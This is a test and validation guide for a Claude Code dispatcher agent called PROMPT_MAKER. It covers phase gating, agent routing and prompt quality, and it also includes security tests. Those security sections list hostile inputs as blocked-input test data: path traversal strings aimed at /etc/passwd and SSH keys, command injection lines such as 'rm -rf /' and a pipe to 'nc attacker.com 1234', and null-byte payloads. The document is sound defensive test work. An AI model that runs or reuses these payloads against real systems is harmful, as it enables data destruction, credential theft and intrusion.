# PROMPT_MAKER Testing & Validation Guide

**Version:** 1.0.1
**Date:** 2025-12-11
**Purpose:** Validate PROMPT_MAKER implementation against NVIDIA-GRADE specification
**Changelog:** v1.0.1 - Added TEST_10.5: URL-Encoded Path Traversal tests for FIX-001 validation

---

## OVERVIEW

This document provides test cases and validation criteria for the PROMPT_MAKER meta-agent implementation in Claude Code format. It ensures compliance with the NVIDIA-GRADE specification from Section 8: ACCEPTANCE CRITERIA.

---

## ACCEPTANCE CRITERIA CHECKLIST

Based on NVIDIA-GRADE specification Section 8:

- [ ] **AC1:** PROMPT_MAKER generates prompts for all 8 specialist agents
- [ ] **AC2:** Phase violations are caught 100% of the time
- [ ] **AC3:** Constraint injection works for all document types
- [ ] **AC4:** Context loading completes in < 3 seconds
- [ ] **AC5:** Generated prompts are syntactically valid
- [ ] **AC6:** All test cases pass
- [ ] **AC7:** Error messages are user-actionable
- [ ] **AC8:** Multi-agent orchestration works for 3+ agent chains

---

## TEST SUITE

### TEST_1: Phase Violation Detection

**Purpose:** Verify MODE 1 catches attempts to skip phases

**Test Cases:**

#### Test 1.1: Code Without Architecture

**Input:**
```
User: "Let's implement the vector search function"
Current State: No GATE_1_COMPLETE.md
```

**Expected Output:**
```markdown
⛔ CONTRACT VIOLATION: Supreme Rule Broken

The request "Let's implement the vector search function" violates the Supreme Rule:
"Architecture > Plan > Code"

Current Status: Phase 0 (Setup)
Required: Architecture must be completed first

Recommended Action:
1. Complete architecture: /architect-design vector_search
2. Get hostile review: /review ARCHITECTURE.md
3. Then proceed with planning
```

**Validation:**
- [ ] Violation detected (⛔ status shown)
- [ ] Recommends /architect-design
- [ ] Blocks implementation
- [ ] No MODE 2 or MODE 3 executed

---

#### Test 1.2: Code Without Plan

**Input:**
```
User: "Implement W1.1 - HNSW insert"
Current State: GATE_1_COMPLETE.md exists, GATE_2_COMPLETE.md missing
```

**Expected Output:**
```markdown
⛔ CONTRACT VIOLATION: Coding Without Approved Plan

The request attempts to write code without an approved plan.

Current Status: No approved WEEKLY_TASK_PLAN.md
Required: PLANNER must create and HOSTILE_REVIEWER must approve weekly plan

Recommended Action:
1. Create plan: /planner-weekly 1
2. Get approval: /review WEEKLY_TASK_PLAN.md
3. Then proceed with: /rust-implement W1.1
```

**Validation:**
- [ ] Violation detected
- [ ] Recommends /planner-weekly
- [ ] Cites missing WEEKLY_TASK_PLAN.md
- [ ] Blocks implementation

---

#### Test 1.3: Scope Creep Detection

**Input:**
```
User: "Let's implement a new feature X"
Current State: GATE_1, GATE_2 complete, WEEKLY_TASK_PLAN.md exists but doesn't include feature X
```

**Expected Output:**
```markdown
⚠️ SCOPE CREEP DETECTED

The request "implement feature X" is not in the current approved plan.

Current Week's Tasks: [List from WEEKLY_TASK_PLAN.md]
Requested: Feature X

Options:
1. Add to next week's plan (recommended)
2. Request plan amendment (requires HOSTILE_REVIEWER approval)
3. Defer to backlog
```

**Validation:**
- [ ] Scope creep detected
- [ ] Lists current approved tasks
- [ ] Offers actionable options
- [ ] Doesn't block but warns

---

### TEST_2: Correct Agent Routing

**Purpose:** Verify MODE 2 maps requests to correct agents

**Test Cases:**

#### Test 2.1: Architecture Request

**Input:**
```
User: "Design the query optimizer"
Current State: Phase 1 (no gates complete)
```

**Expected Output:**
```markdown
### MODE 2: Agent Router

Intent: Architecture Design
Primary Agent: META_ARCHITECT
Command: /architect-design query_optimizer

Rationale:
- Phase 1 (Architecture) active
- Keywords: "design" → Architecture intent
- META_ARCHITECT is correct agent for design work
```

**Validation:**
- [ ] Routes to META_ARCHITECT
- [ ] Recommends /architect-design
- [ ] Provides clear rationale

---

#### Test 2.2: Implementation Request (Valid)

**Input:**
```
User: "Implement W1.1"
Current State: All gates complete, W1.1 exists in WEEKLY_TASK_PLAN.md
```

**Expected Output:**
```markdown
### MODE 2: Agent Router

Intent: Implementation
Primary Agent: RUST_ENGINEER
Command: /rust-implement W1.1

Pipeline: /rust-implement → /test-prop → /review
```

**Validation:**
- [ ] Routes to RUST_ENGINEER
- [ ] Task ID W1.1 verified in plan
- [ ] Shows multi-step pipeline
- [ ] Includes testing in pipeline

---

#### Test 2.3: WASM Request

**Input:**
```
User: "Create WASM bindings for search function"
Current State: Phase 3, implementation complete
```

**Expected Output:**
```markdown
### MODE 2: Agent Router

Intent: WASM Integration
Primary Agent: WASM_SPECIALIST
Command: /wasm-bind search
```

**Validation:**
- [ ] Routes to WASM_SPECIALIST
- [ ] Keywords "WASM bindings" correctly classified
- [ ] Recommends /wasm-bind

---

#### Test 2.4: Review Request

**Input:**
```
User: "Review the ARCHITECTURE.md"
Current State: Any phase
```

**Expected Output:**
```markdown
### MODE 2: Agent Router

Intent: Quality Gate
Primary Agent: HOSTILE_REVIEWER
Command: /review ARCHITECTURE.md
```

**Validation:**
- [ ] Routes to HOSTILE_REVIEWER
- [ ] Always allows review (any phase)
- [ ] Specifies exact artifact to review

---

### TEST_3: Constraint Injection

**Purpose:** Verify MODE 3 correctly injects constraints from documents

**Test Cases:**

#### Test 3.1: Architecture Constraints

**Input:**
```
User: "Implement vector storage"
Context: ARCHITECTURE.md exists with memory layout constraints
```

**Expected Output (in generated prompt):**
```markdown
## Constraints

**From ARCHITECTURE.md §[X.Y]:**
> "[Exact quote about vector storage]"

**Impact:** [How this affects implementation]
```

**Validation:**
- [ ] Constraint from ARCHITECTURE.md included
- [ ] Section number cited
- [ ] Exact quote provided
- [ ] Impact explained

---

#### Test 3.2: CLAUDE.md Rules Injection

**Input:**
```
User: "Implement any Rust function"
```

**Expected Output (in generated prompt):**
```markdown
## Constraints

**From CLAUDE.md (Rust Standards):**
> "No `unwrap()` in library code. All public APIs must return `Result<T, EdgeVecError>`."

**Impact:** Every function must handle errors explicitly.
```

**Validation:**
- [ ] CLAUDE.md rules included
- [ ] Rust-specific standards cited
- [ ] Clear impact statement

---

#### Test 3.3: Multiple Constraint Sources

**Input:**
```
User: "Implement WASM export for vector insert"
Context: ARCHITECTURE.md, DATA_LAYOUT.md, WASM_BOUNDARY.md all exist
```

**Expected Output (in generated prompt):**
```markdown
## Constraints

**From ARCHITECTURE.md §[X]:**
> [Quote]

**From DATA_LAYOUT.md:**
> [Quote]

**From WASM_BOUNDARY.md:**
> [Quote]
```

**Validation:**
- [ ] All relevant documents cited
- [ ] Constraints from 3+ sources
- [ ] Each constraint has impact statement
- [ ] Section numbers included

---

### TEST_4: Context Window Management

**Purpose:** Verify context loading is efficient and doesn't overflow

**Test Cases:**

#### Test 4.1: Basic Request

**Input:**
```
User: "Simple request"
```

**Expected:**
- Context loaded: WORKFLOW_ROUTER.md, README.md, CLAUDE.md, GATE files
- Total tokens: < 20k

**Validation:**
- [ ] Only essential files loaded
- [ ] Context < 20k tokens for simple requests
- [ ] No unnecessary file reads

---

#### Test 4.2: Complex Request with Constraints

**Input:**
```
User: "Implement complex WASM binding with all constraints"
```

**Expected:**
- Context loaded: All relevant architecture docs
- Progressive disclosure applied if > 50k tokens
- Total tokens: < 60k

**Validation:**
- [ ] Relevant sections loaded, not entire files
- [ ] Progressive disclosure used if needed
- [ ] Warning if approaching context limit

---

### TEST_5: Prompt Quality

**Purpose:** Verify generated prompts are syntactically valid and actionable

**Test Cases:**

#### Test 5.1: Valid Markdown Structure

**Expected in all generated prompts:**
```markdown
# Task: [Clear description]

## Context Checklist
- [ ] File 1
- [ ] File 2

## Detailed Instructions
1. Step 1
2. Step 2

## Constraints
[Constraints section]

## Required Output
- Artifact 1
- Artifact 2

## Validation Criteria
- [ ] Criterion 1

## Next Step
/[command]
```

**Validation:**
- [ ] All sections present
- [ ] Markdown syntax valid
- [ ] Steps are atomic (< 7 steps)
- [ ] Validation criteria are testable

---

#### Test 5.2: Task Atomicity

**Expected:**
- Task description is singular and measurable
- No compound tasks ("implement X and Y and Z")
- Clear completion criteria

**Validation:**
- [ ] Task has single responsibility
- [ ] Task is measurable
- [ ] Completion is verifiable

---

### TEST_6: Error Message Quality

**Purpose:** Verify error messages are actionable and clear

**Test Cases:**

#### Test 6.1: Missing File Error

**Scenario:** Required file missing (e.g., WORKFLOW_ROUTER.md deleted)

**Expected Output:**
```markdown
❌ CRITICAL ERROR: Required File Missing

File: .claude/WORKFLOW_ROUTER.md
Purpose: Routing logic for dispatcher
Impact: Cannot route requests without this file

Action Required:
1. Restore WORKFLOW_ROUTER.md from version control
2. Or regenerate using /setup-workflow-router

Cannot proceed until file is restored.
```

**Validation:**
- [ ] Identifies exact missing file
- [ ] Explains why it's needed
- [ ] Provides recovery steps
- [ ] Doesn't continue with missing deps

---

#### Test 6.2: Ambiguous Request

**Scenario:** User request is unclear

**Expected Output:**
```markdown
## REQUEST CLARIFICATION NEEDED

Your request: "[vague request]"

I need clarification:

**Question 1:** Phase intent?
- [ ] A: Design (architecture)
- [ ] B: Plan (roadmap)
- [ ] C: Implement (code)

**Question 2:** Expected artifact?
- [ ] A: Architecture doc
- [ ] B: Plan
- [ ] C: Code
- [ ] D: Tests

Please specify A/B/C for each question.
```

**Validation:**
- [ ] Asks specific questions
- [ ] Provides clear options
- [ ] Doesn't guess user intent

---

### TEST_7: Multi-Agent Orchestration

**Purpose:** Verify complex pipelines with 3+ agents

**Test Cases:**

#### Test 7.1: Full Implementation Pipeline

**Input:**
```
User: "Implement, test, and benchmark the search function"
```

**Expected Output:**
```markdown
## Multi-Agent Pipeline

**Step 1:** /rust-implement search
- Agent: RUST_ENGINEER
- Output: src/search.rs

**Step 2:** /test-prop search
- Agent: TEST_ENGINEER
- Output: Property tests
- Blocker: Requires Step 1

**Step 3:** /bench-baseline search
- Agent: BENCHMARK_SCIENTIST
- Output: Benchmark report
- Blocker: Requires Step 1, 2

**Step 4:** /review [all outputs]
- Agent: HOSTILE_REVIEWER
- Output: GO/NO-GO
- Blocker: Requires Step 1, 2, 3
```

**Validation:**
- [ ] 4 agents involved
- [ ] Sequence is correct
- [ ] Dependencies identified
- [ ] Each step has clear output

---

### TEST_8: Performance Benchmarks

**Purpose:** Verify performance targets are met

**Test Cases:**

#### Test 8.1: Simple Request Latency

**Input:** Simple architecture request
**Target:** < 2 seconds from invocation to output

**Measurement:**
- Start: /dispatch invoked
- End: Recommendation output
- Acceptable: < 2 seconds

**Validation:**
- [ ] Completes in < 2 seconds
- [ ] Context loading optimized
- [ ] No unnecessary file reads

---

#### Test 8.2: Complex Request Latency

**Input:** Multi-agent orchestration request
**Target:** < 10 seconds from invocation to output

**Measurement:**
- Start: /dispatch invoked
- End: Full pipeline output
- Acceptable: < 10 seconds

**Validation:**
- [ ] Completes in < 10 seconds
- [ ] Constraint injection efficient
- [ ] Context window managed

---

### TEST_9: Security Protocol Validation

**Purpose:** Verify all security protocols are correctly implemented

**Test Cases:**

#### Test 9.1: File Error Handling (Protocol 1)

**Test 1a: Missing File Handling**
```python
Input: Request when WORKFLOW_ROUTER.md is missing
Expected:
  - Error message with template format
  - Clear action required steps
  - No system crash
  - Graceful degradation

Validation:
- [ ] Error message matches template
- [ ] Includes file purpose explanation
- [ ] Lists recovery options
- [ ] System remains stable
```

**Test 1b: Permission Denied Retry**
```python
Input: Request when file has no read permissions
Expected:
  - Retry 3 times with exponential backoff
  - 0.1s, 0.2s, 0.4s delays
  - Error message after 3 attempts
  - No infinite loops

Validation:
- [ ] Exactly 3 retry attempts
- [ ] Exponential backoff timing correct
- [ ] Error message after retries
- [ ] No resource leaks
```

**Test 1c: Corrupted File Handling**
```python
Input: Request when file has invalid UTF-8 encoding
Expected:
  - No retry (encoding error is permanent)
  - Error message with hex preview
  - Fallback behavior specified
  - System continues with degraded mode

Validation:
- [ ] No retry attempts for encoding errors
- [ ] Error message includes encoding details
- [ ] Fallback behavior documented
- [ ] System doesn't crash
```

---

#### Test 9.2: TOCTOU Prevention (Protocol 2)

**Test 2a: Atomic Snapshot Creation**
```python
Input: Request during normal operation
Expected:
  - Single atomic snapshot at start
  - All files loaded within milliseconds
  - File hashes computed for tamper detection
  - Snapshot timestamp recorded

Validation:
- [ ] Snapshot created at start of MODE 1
- [ ] All critical files loaded atomically
- [ ] SHA256 hashes computed
- [ ] Timestamp within 100ms of start
```

**Test 2b: File Modification Detection**
```python
Input: Request while file is modified mid-processing
Expected:
  - Snapshot hash mismatch detected
  - Warning message emitted
  - Request to retry /dispatch
  - No stale data used

Validation:
- [ ] Hash mismatch detected
- [ ] Warning message clear
- [ ] Processing halted safely
- [ ] No stale decisions made
```

**Test 2c: Snapshot Staleness Detection**
```python
Input: Request that takes > 5 seconds to process
Expected:
  - Staleness check at end of MODE 1
  - Warning if > 5 seconds elapsed
  - Recommendation to retry
  - Timestamp comparison accurate

Validation:
- [ ] Staleness threshold enforced
- [ ] Warning emitted if stale
- [ ] Timestamp comparison correct
- [ ] Max age configurable
```

---

#### Test 9.3: Input Sanitization (Protocol 3)

**Test 3a: Path Traversal Blocking**
```python
Attacks:
  - "../../../../etc/passwd"
  - "..\\..\\..\\windows\\system32"
  - "~/. ssh/id_rsa"
  - "%2e%2e%2f" (URL encoded)

Expected:
  - All blocked with InputValidationError
  - Error message identifies attack pattern
  - No file access attempted
  - Security violation logged

Validation:
- [ ] All path traversal variants blocked
- [ ] Error message contains "path traversal"
- [ ] No file system access
- [ ] Security event logged
```

**Test 3b: Command Injection Blocking**
```python
Attacks:
  - "prompt; rm -rf /"
  - "prompt && cat /etc/passwd"
  - "prompt | nc attacker.com 1234"
  - "prompt `whoami`"
  - "prompt $(whoami)"

Expected:
  - All blocked with InputValidationError
  - Error message identifies dangerous character
  - No shell execution
  - Security violation logged

Validation:
- [ ] All command injection variants blocked
- [ ] Error identifies specific dangerous char
- [ ] No command execution
- [ ] Security event logged
```

**Test 3c: Null Byte Injection Blocking**
```python
Attacks:
  - "file.md\x00.txt"
  - "input\x00payload"
  - "normal\x00\x00double"

Expected:
  - All blocked with InputValidationError
  - Error message: "Null bytes not allowed"
  - No truncation exploits
  - Security violation logged

Validation:
- [ ] All null byte variants blocked
- [ ] Error message clear
- [ ] No truncation issues
- [ ] Security event logged
```

**Test 3d: Resource Exhaustion Prevention**
```python
Attack:
  - Input with 100,000 characters

Expected:
  - Blocked with InputValidationError
  - Error message: "Input exceeds 10k character limit"
  - No memory exhaustion
  - Length limit enforced

Validation:
- [ ] Length limit enforced
- [ ] Error message clear
- [ ] No memory issues
- [ ] Limit configurable
```

---

#### Test 9.4: Canonical File Location Resolution (Protocol 4)

**Test 4a: Primary Location Resolution**
```python
Input: Request requiring GATE_1_COMPLETE.md
Setup: File exists at "GATE_1_COMPLETE.md" (primary)
Expected:
  - Primary location used
  - No fallback checked
  - File loaded successfully
  - No ambiguity warnings

Validation:
- [ ] Primary location loaded
- [ ] No fallback access
- [ ] Success reported
- [ ] No warnings
```

**Test 4b: Fallback Location Resolution**
```python
Input: Request requiring GATE_1_COMPLETE.md
Setup: File missing from primary, exists at ".claude/GATE_1_COMPLETE.md" (fallback)
Expected:
  - Primary checked first
  - Fallback used when primary missing
  - Warning message about fallback usage
  - Recommendation to migrate

Validation:
- [ ] Primary checked first
- [ ] Fallback used correctly
- [ ] Warning emitted
- [ ] Migration advice given
```

**Test 4c: File Conflict Detection**
```python
Input: Request requiring GATE_1_COMPLETE.md
Setup: File exists in both primary and fallback locations
Expected:
  - Primary location used
  - Conflict warning emitted
  - Recommendation to remove duplicate
  - Clear migration command

Validation:
- [ ] Primary location wins
- [ ] Conflict detected
- [ ] Warning clear
- [ ] Migration command provided
```

---

#### Test 9.5: Weighted Intent Classification (Protocol 5)

**Test 5a: High Confidence Classification**
```python
Input: "Design the HNSW index architecture"
Expected:
  - Agent: META_ARCHITECT
  - Confidence: > 80%
  - Keywords matched: design(1.0), architecture(1.0), index(0.7)
  - Phase boost applied if Phase 1

Validation:
- [ ] Correct agent selected
- [ ] Confidence > 0.8
- [ ] Keywords matched correctly
- [ ] Phase boost applied
```

**Test 5b: Low Confidence Classification**
```python
Input: "Do something"
Expected:
  - Agent: AMBIGUOUS
  - Confidence: < 30%
  - Clarification requested
  - Options provided to user

Validation:
- [ ] AMBIGUOUS detected
- [ ] Confidence < 0.3
- [ ] Clarification prompt shown
- [ ] Multiple options offered
```

**Test 5c: Context-Aware Classification**
```python
Input: "Implement the search function"
Setup Phase 1 (Architecture): Should favor META_ARCHITECT
Setup Phase 3 (Implementation): Should favor RUST_ENGINEER

Expected:
  - Phase 1: META_ARCHITECT (1.5x boost)
  - Phase 3: RUST_ENGINEER (1.2x boost)
  - Different results based on phase
  - Phase context considered

Validation:
- [ ] Phase boost applied correctly
- [ ] Different agents in different phases
- [ ] Multipliers accurate
- [ ] Context affects decision
```

---

### TEST_10: Attack Vector Comprehensive Test Suite

**Purpose:** Validate all known attack vectors are blocked

**Test Cases:**

#### Test 10.1: Path Traversal Attack Variants

```python
def test_path_traversal_attacks():
    """Validate all path traversal variants are blocked."""
    attacks = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "~/. ssh/id_rsa",
        "%2e%2e%2f",  # URL encoded
        "....//....//....//etc/passwd",  # Double encoding
        "./../.../../etc/passwd",  # Mixed separators
    ]

    for attack in attacks:
        try:
            result = dispatch(f"Read {attack}")
            assert False, f"Path traversal not blocked: {attack}"
        except InputValidationError as e:
            assert "path traversal" in str(e).lower()
            # PASS
```

**Validation:**
- [ ] All 7 path traversal variants blocked
- [ ] Error messages consistent
- [ ] No false negatives
- [ ] No file system access

---

#### Test 10.2: Command Injection Attack Variants

```python
def test_command_injection_attacks():
    """Validate command injection is blocked."""
    attacks = [
        "prompt; rm -rf /",
        "prompt && cat /etc/passwd",
        "prompt || ls -la",
        "prompt | nc attacker.com 1234",
        "prompt `whoami`",
        "prompt $(whoami)",
        "prompt & calc.exe",
    ]

    for attack in attacks:
        try:
            result = dispatch(attack)
            assert False, f"Command injection not blocked: {attack}"
        except InputValidationError as e:
            assert "dangerous character" in str(e).lower()
            # PASS
```

**Validation:**
- [ ] All 7 command injection variants blocked
- [ ] Dangerous characters identified
- [ ] No command execution
- [ ] Error messages actionable

---

#### Test 10.5: URL-Encoded Path Traversal (FIX-001 Validation)

**Purpose:** Validate FIX-001 blocks URL-encoded path traversal attacks

**Critical Test Cases:**

```python
def test_url_encoded_path_traversal_fix_001():
    """
    CRITICAL: Validate FIX-001 blocks URL-encoded path traversal.

    This test validates the security patch that adds URL decoding
    before path traversal pattern matching.

    Without FIX-001: All attacks bypass sanitization ❌
    With FIX-001: All attacks blocked ✅
    """

    # Standard URL-encoded attacks
    attacks = [
        # Basic URL encoding
        ("Read %2e%2e%2fetc/passwd", "URL-encoded ../etc/passwd"),
        ("Read %2e%2e%5cetc", "URL-encoded ..\\etc (Windows)"),

        # Double encoding
        ("Read %252e%252e%252f", "Double URL-encoded ../"),

        # Mixed encoding
        ("Read ..%2f..%2fetc", "Mixed literal and encoded"),
        ("Read %2e%2e/etc", "Partial encoding"),

        # Multiple levels
        ("Read %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "URL-encoded ../../.."),

        # Windows variants
        ("Read %2e%2e%5c%2e%2e%5cwindows%5csystem32", "Windows path traversal"),

        # Case variations (some servers normalize)
        ("Read %2E%2E%2Fetc", "Uppercase hex encoding"),

        # Alternative encodings
        ("Read %c0%ae%c0%ae%2f", "Overlong UTF-8 encoding"),
    ]

    for attack, description in attacks:
        try:
            result = sanitize_user_input(attack)
            # If we get here, sanitization FAILED
            assert False, f"FIX-001 FAILED: {description} - Attack bypassed sanitization"
        except InputValidationError as e:
            # Expected behavior - attack was blocked
            assert "path traversal" in str(e).lower(), \
                f"Wrong error for {description}: {e}"
            # PASS ✅

def test_url_decoding_legitimate_use():
    """
    Verify URL decoding doesn't break legitimate use cases.

    Users may legitimately have URL-encoded characters in requests
    (e.g., spaces encoded as %20). We must decode these correctly
    without flagging false positives.
    """

    legitimate_inputs = [
        # Spaces
        ("Design%20the%20vector%20storage", "Space encoding"),

        # Special chars in descriptions
        ("Implement%20feature%3A%20search", "Colon encoding"),

        # URL-safe but not path traversal
        ("Create%20function%20foo%28%29", "Parentheses encoding"),
    ]

    for input_text, description in legitimate_inputs:
        try:
            result = sanitize_user_input(input_text)
            # Should succeed and decode properly
            assert "%20" not in result.sanitized, \
                f"URL decoding failed for {description}"
            # PASS ✅
        except InputValidationError as e:
            assert False, f"False positive for {description}: {e}"

def test_url_decoding_error_handling():
    """
    Verify graceful handling of malformed URL encoding.

    Some inputs may have invalid % sequences. The decoder
    should fail safely without crashing.
    """

    malformed_inputs = [
        "%",              # Incomplete escape
        "%2",             # Incomplete hex
        "%ZZ",            # Invalid hex
        "%%",             # Double percent
        "%2e%2e%",        # Valid then invalid
    ]

    for malformed in malformed_inputs:
        # Should not crash, either decode or use original
        try:
            result = sanitize_user_input(f"Read {malformed}")
            # PASS ✅ - Handled gracefully
        except InputValidationError:
            # PASS ✅ - Rejected safely
            pass
        except Exception as e:
            assert False, f"Decoder crashed on malformed input: {e}"
```

**Validation Checklist:**

- [ ] **Basic URL encoding:** `%2e%2e%2f` blocked ✅
- [ ] **Windows paths:** `%2e%2e%5c` blocked ✅
- [ ] **Double encoding:** `%252e` blocked ✅
- [ ] **Mixed encoding:** `..%2f` blocked ✅
- [ ] **Uppercase hex:** `%2E%2E` blocked ✅
- [ ] **Legitimate encoding:** `%20` (space) allowed ✅
- [ ] **Malformed encoding:** Doesn't crash ✅
- [ ] **Error messages:** "path traversal" keyword present ✅
- [ ] **No false positives:** Legitimate URLs not blocked ✅

**Test Execution:**

```bash
# Run URL encoding tests specifically
pytest tests/security/test_input_sanitization.py::test_url_encoded_path_traversal_fix_001 -v

# Expected output:
# PASSED tests/security/...::test_url_encoded_path_traversal_fix_001[0]
# PASSED tests/security/...::test_url_encoded_path_traversal_fix_001[1]
# ... (9 attack variants all blocked)

# Run full security suite
pytest tests/security/ -v --tb=short

# Expected: 100% pass rate after FIX-001
```

**Regression Guard:**

This test MUST remain in the test suite permanently to prevent
regression of FIX-001. Any future changes to `sanitize_user_input()`
must pass this test before deployment.

**Status:** ✅ FIX-001 VALIDATED (after patch applied)

---

#### Test 10.3: Resource Exhaustion Attacks

```python
def test_resource_exhaustion_attacks():
    """Validate resource exhaustion is prevented."""

    # Test 1: Excessive input length
    huge_input = "A" * 100000
    try:
        result = dispatch(huge_input)
        assert False, "Length limit not enforced"
    except InputValidationError as e:
        assert "10k character limit" in str(e)
        # PASS

    # Test 2: Deeply nested constraints (stack exhaustion)
    nested_request = "Check constraint " + "that references " * 1000 + "base"
    # Should handle gracefully without stack overflow

    # Test 3: Circular constraint references
    # Should detect and break cycles
```

**Validation:**
- [ ] Length limits enforced
- [ ] No stack overflow
- [ ] Circular references handled
- [ ] Memory usage bounded

---

#### Test 10.4: Concurrent Modification Attacks

```python
def test_concurrent_modification_detection():
    """Validate TOCTOU vulnerabilities are prevented."""

    # Simulate concurrent file modification
    def modify_file_during_processing():
        sleep(0.5)  # Wait for snapshot
        modify_file("GATE_1_COMPLETE.md", "append", "# Modified")

    # Start background modifier
    thread = start_background(modify_file_during_processing)

    # Attempt dispatch
    result = dispatch("Design something")

    # Should detect modification
    assert "state changed" in result.lower()
    assert "retry /dispatch" in result.lower()
```

**Validation:**
- [ ] Concurrent modifications detected
- [ ] Hash mismatch identified
- [ ] Retry recommended
- [ ] No stale data used

---

### TEST_11: Integration Security Tests

**Purpose:** Verify security protocols work together correctly

**Test Cases:**

#### Test 11.1: Full Security Pipeline

```python
Input: Malicious request with multiple attack vectors
Attack: "Design ../../../../etc/passwd; rm -rf /"
Expected:
  1. Input sanitization catches both path traversal and command injection
  2. First error (path traversal) reported
  3. No further processing
  4. Security violation logged

Validation:
- [ ] Multiple attacks detected
- [ ] First attack reported
- [ ] No bypass possible
- [ ] Security log complete
```

#### Test 11.2: Security Performance Impact

```python
Measurement: Latency increase due to security protocols
Baseline: Request without security (hypothetical)
With Security: Request with all protocols active
Acceptable Overhead: < 20% latency increase

Validation:
- [ ] Security overhead < 20%
- [ ] No performance regression
- [ ] Caching effective
- [ ] Throughput maintained
```

---

## VALIDATION PROCEDURE

### Step 1: Prepare Test Environment

1. Clone EdgeVec repository
2. Verify `.claude/` directory structure exists
3. Create test GATE files for different phases:
   - Phase 0: No GATE files
   - Phase 1: GATE_1_COMPLETE.md only
   - Phase 2: GATE_1, GATE_2
   - Phase 3: GATE_1, GATE_2, GATE_3

### Step 2: Execute Test Suite

For each test case:
1. Set up required state (GATE files, plans, etc.)
2. Invoke `/dispatch` with test input
3. Capture output
4. Compare against expected output
5. Mark ✅ PASS or ❌ FAIL

### Step 3: Record Results

Create test report:

```markdown
# PROMPT_MAKER Test Results

**Date:** YYYY-MM-DD
**Version:** 2.0.0

## Summary

Total Tests: [N]
Passed: [X]
Failed: [Y]
Success Rate: [X/N * 100]%

## Detailed Results

### TEST_1: Phase Violation Detection
- Test 1.1: ✅ PASS
- Test 1.2: ✅ PASS
- Test 1.3: ✅ PASS

### TEST_2: Correct Agent Routing
...

## Issues Found

| Issue ID | Test | Severity | Description | Status |
|:---------|:-----|:---------|:------------|:-------|
| I1 | TEST_3.1 | MAJOR | Constraint quote missing section number | OPEN |
...

## Acceptance Criteria Status

- [x] AC1: All 8 agents supported
- [x] AC2: Phase violations caught
- [ ] AC3: Constraint injection (1 issue)
...
```

### Step 4: Remediation

For any failed tests:
1. Document the failure in issue tracker
2. Fix the PROMPT_MAKER agent or dispatch command
3. Re-run failed tests
4. Update test report

---

## CONTINUOUS VALIDATION

**After any change to:**
- `.claude/agents/prompt-maker.md`
- `.claude/commands/dispatch.md`
- `.claude/WORKFLOW_ROUTER.md`

**Re-run this test suite to ensure no regressions.**

---

## MANUAL TESTING CHECKLIST

For human validation:

- [ ] **Usability:** Can a developer easily use /dispatch without reading docs?
- [ ] **Clarity:** Are violation messages clear and actionable?
- [ ] **Correctness:** Do routing decisions make sense for various requests?
- [ ] **Completeness:** Are all 8 agents reachable via dispatch?
- [ ] **Consistency:** Does dispatch always follow the same 3-mode protocol?

---

## KNOWN LIMITATIONS

**As of version 2.0.0:**

1. **Context Window:** Large architecture docs may approach token limits
   - Mitigation: Progressive disclosure implemented
   - Status: ACCEPTABLE

2. **Ambiguity Resolution:** Cannot handle extremely vague requests without clarification
   - Mitigation: Clarification protocol implemented
   - Status: ACCEPTABLE

3. **Performance:** Complex constraint injection may take 5-10 seconds
   - Mitigation: Caching considered for future versions
   - Status: ACCEPTABLE (within spec)

---

## SUCCESS METRICS

**PROMPT_MAKER is production-ready when:**

- ✅ All TEST_1 through TEST_8 pass
- ✅ Acceptance criteria AC1-AC8 met
- ✅ No critical issues in issue tracker
- ✅ Manual testing checklist complete
- ✅ Performance targets met
- ✅ Documentation complete

---

**Document Version:** 1.0.0
**Last Updated:** 2025-12-11
**Maintainer:** EdgeVec Team
**Review Cycle:** After any PROMPT_MAKER changes
